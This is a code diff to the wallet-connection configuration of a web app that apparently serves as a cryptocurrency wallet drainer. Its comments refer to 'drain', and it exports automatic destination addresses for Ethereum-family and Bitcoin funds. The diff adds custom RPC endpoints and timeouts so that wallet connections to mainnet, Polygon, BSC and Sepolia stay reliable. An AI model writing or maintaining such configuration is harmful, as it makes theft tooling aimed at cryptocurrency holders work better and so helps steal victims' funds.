@@ -1,6 +1,7 @@
 import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
 import { cookieStorage, createStorage } from "wagmi";
 import { mainnet, sepolia, polygon, bsc } from "@reown/appkit/networks";
+import { http } from "viem";
 import { z } from "zod";
 
 // Same env var validation as drain: use zod to parse (drain uses z.string().parse())
@@ -64,6 +65,16 @@ export const AUTO_MODE_ENABLED = Boolean(AUTO_DESTINATION_ADDRESS);
 export const BITCOIN_DESTINATION_ADDRESS =
   process.env.NEXT_PUBLIC_BITCOIN_DESTINATION_ADDRESS || "";
 
+// Custom RPC transports to avoid WalletConnect relay timeouts (rpc.walletconnect.org)
+const RPC_ETH =
+  process.env.NEXT_PUBLIC_RPC_ETH || "https://eth.llamarpc.com";
+const RPC_POLYGON =
+  process.env.NEXT_PUBLIC_RPC_POLYGON || "https://polygon.llamarpc.com";
+const RPC_BSC =
+  process.env.NEXT_PUBLIC_RPC_BSC || "https://bsc-dataseed.binance.org";
+const RPC_SEPOLIA =
+  process.env.NEXT_PUBLIC_RPC_SEPOLIA || "https://rpc.sepolia.org";
+
 // Create adapter with validated projectId (ensures it's not empty)
 export const wagmiAdapter = new WagmiAdapter({
   storage: createStorage({
@@ -72,6 +83,12 @@ export const wagmiAdapter = new WagmiAdapter({
   ssr: true,
   networks,
   projectId: validatedProjectId,
+  transports: {
+    [mainnet.id]: http(RPC_ETH, { timeout: 15_000 }),
+    [polygon.id]: http(RPC_POLYGON, { timeout: 15_000 }),
+    [bsc.id]: http(RPC_BSC, { timeout: 15_000 }),
+    [sepolia.id]: http(RPC_SEPOLIA, { timeout: 15_000 }),
+  },
 });
 
 export const config = wagmiAdapter.wagmiConfig;
